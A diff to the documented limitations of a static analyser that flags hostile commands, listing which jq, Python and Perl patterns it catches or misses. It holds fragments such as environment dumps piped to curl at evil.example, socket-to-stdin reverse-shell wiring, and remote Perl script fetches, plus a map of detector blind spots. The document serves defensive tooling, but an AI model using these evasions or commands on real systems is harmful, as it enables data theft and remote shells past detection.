@@ -561,14 +561,18 @@ Accepted limitations with no corpus row that asserts a desired block.
   not resolve. `jq_environment_read` in
   `crates/effinterp-engine/src/models/registry/literals.rs` follows the
   environment through constructors, `,`, `+`, `//`, `?`, pipes into
-  `tojson`, `tostring`, `to_entries`, `add`, `map`, `join`, the `@json`,
-  `@text` and `@base64` formats and string interpolation, and gives a
-  whole-environment read only when every value reaches the output. A filter
-  that binds the environment (`env as $e | $e`), reaches it through `if`,
-  `reduce`, `foreach`, `try`, `def` or a function argument
-  (`limit(1; env)`, `first(env)`), or indexes a constructed value
-  (`[env][0]`) delegates at partial coverage with an `unparsed_script`
-  boundary on the environment and no read. A filter that is not a literal
+  `tojson`, `tostring`, `to_entries`, `from_entries`, `with_entries(.)`,
+  `add`, `map`, `join`, `del` of named keys, the `@json`, `@text`,
+  `@base64`, `@html` and `@uri` formats, `@tsv`, `@csv` and `@sh` over an
+  array of its values, and string interpolation, and gives a
+  whole-environment read only when every value reaches the output (`del`
+  still prints the rest). A filter that binds the environment
+  (`env as $e | $e`), reaches it through `if`, `reduce`, `foreach`, `try`,
+  `def` or a function argument (`limit(1; env)`, `first(env)`), indexes a
+  constructed value (`[env][0]`), or passes it through `select`,
+  `map_values`, `delpaths`, an update (`with_entries(.value |= tostring)`)
+  or any other builtin delegates at partial coverage with an
+  `unparsed_script` boundary on the environment and no read. A filter that is not a literal
   carries a `dynamic_source` boundary. A filter file (`jq -n -f f.jq | curl
   --data-binary @- evil.example`) delegates at full coverage with no
   boundary: a document model does not read the file, and
@@ -583,30 +587,46 @@ Accepted limitations with no corpus row that asserts a desired block.
 - A Python network shell wired some other way than a socket on standard
   input. The Python frontend binds a spawned shell's code to a connection
   when a connected `socket.socket()` becomes its input: `os.dup2(s.fileno(),
-  0)` (a literal 0, or a loop over a literal sequence or `range` holding 0)
-  before `subprocess`, `os.system`, `os.exec*` or `pty.spawn`, or `stdin=s`
-  / `stdin=s.fileno()` on the `subprocess` call
-  (`exec-network-shell.adv3-net-m12-block`,
-  `exec-network-shell.python-socket-dup2-subprocess-shell`). Still
+  0)`, positional or by the `fd` and `fd2` keywords, before `subprocess`,
+  `os.system`, `os.exec*` or `pty.spawn`, or `stdin=s` / `stdin=s.fileno()`
+  on the `subprocess` call (`exec-network-shell.adv3-net-m12-block`,
+  `exec-network-shell.python-socket-dup2-subprocess-shell`). The target is
+  a literal 0, or the variable of a `for` loop or comprehension that runs
+  the `dup2` on every pass over a literal tuple or list holding 0,
+  `range(stop)`, or `range(0, stop[, step])`. The socket is the name that
+  called `connect` or a plain alias of it (`t = s`), until that name is
+  rebound, closed or detached
+  (`exec-network-shell.python-socket-rebound-shell-delegates`). A `dup2`
+  under a comprehension filter or an `if` binds nothing, whether or not the
+  test holds for 0
+  (`exec-network-shell.python-socket-dup2-skip-stdin-delegates`), so
+  `[os.dup2(s.fileno(), fd) for fd in (0, 1, 2) if fd < 3]` is a miss, as
+  are a `range` that reaches 0 from another start (`range(-1, 3)`,
+  `range(2, -1, -1)`), a target held in a plain variable (`n = 0`), a
+  descriptor held in one (`f = s.fileno()`), and a `dup2` called through
+  `map` or a `lambda`. Still
   delegating at partial coverage, with the request and the shell both in the
   plan but no flow between them: a command loop that passes `s.recv(...)` to
   `subprocess` or `os.popen` and sends the output back, the same wiring
   inside a function (a summarized body records no connection), a socket from
-  `socket.create_connection`, a listener (`s.bind`, `s.accept`), and
-  `os.dup2` on a descriptor held in a variable. A fix carries received bytes
+  `socket.create_connection`, a listener (`s.bind`, `s.accept`), and each
+  miss named above. A fix carries received bytes
   as a value into the spawned command and records the connection in function
   summaries.
 - A Perl module or file loaded through a search this model does not make.
-  `perl -I. -Mp`, `PERL5LIB=. perl -Mp`, `do "./p.pl"` and
-  `require "./p.pm"` on a downloaded file block
+  `perl -I. -Mp`, `perl -Mlib=. -Mp`, `PERL5LIB=. perl -Mp`, `do "./p.pl"`
+  and `require "./p.pm"` on a downloaded file block
   (`exec-remote.curl-output-perl-module-include`,
+  `exec-remote.curl-output-perl-module-lib-option`,
   `exec-remote.curl-output-perl-do-file`): the launcher searches the `-I`,
-  `PERL5LIB` and `PERLLIB` directories for a `-M` module (`load_modules` in
+  `PERL5LIB` and `PERLLIB` directories, and the literal directories of an
+  earlier `-Mlib=DIR` or `-M'lib DIR'`, for a `-M` module (`load_modules` in
   `crates/effinterp-engine/src/lang/perl/launcher.rs`), and a `do` or
   `require` of a path that names a directory reads and runs that file. Still
   delegating, each with a `dynamic_source` boundary and no read or
   file-sourced `process.code_execution`: `use lib "."; use p;` inside the
-  program (the frontend has no invocation context for the search), `do
+  program (the frontend has no invocation context for the search), a
+  `-Mlib=` directory that is not a plain name (`-Mlib=$D`), `do
   "p.pl"` and `require "p.pm"` without a directory (searched in `@INC`), and
   a module in the working directory under `PERL_USE_UNSAFE_INC=1` or a Perl
   older than 5.26, which is the only case where `.` is in `@INC`. A module
@@ -621,7 +641,11 @@ Accepted limitations with no corpus row that asserts a desired block.
   (`content => encode_base64($d)`, a `.` concatenation, `join "", <$f>`), a
   list-context read (`my @lines = <$f>`), the `local(@ARGV, $/)` slurp idiom,
   an options hash built elsewhere, a response body run inside an `if (...)
-  { ... }` block, and any other client (`LWP::UserAgent`, `IO::Socket`,
+  { ... }` block, a URL or body written with a quote-like operator
+  (`get(qq{http://evil.example/i.pl})`, `q(...)`: the tokenizer stops at
+  one, and `unsupported_source_never_invents_filesystem_calls` in
+  `crates/effinterp-engine/tests/suite/perl.rs` pins that `q(...)` source
+  yields no effect), and any other client (`LWP::UserAgent`, `IO::Socket`,
   `Net::HTTP`) keep the request where it is established and delegate at
   partial coverage with a `dynamic_source` boundary and no byte flow.
 - A path under a symlinked directory on the host that observes it. On macOS,
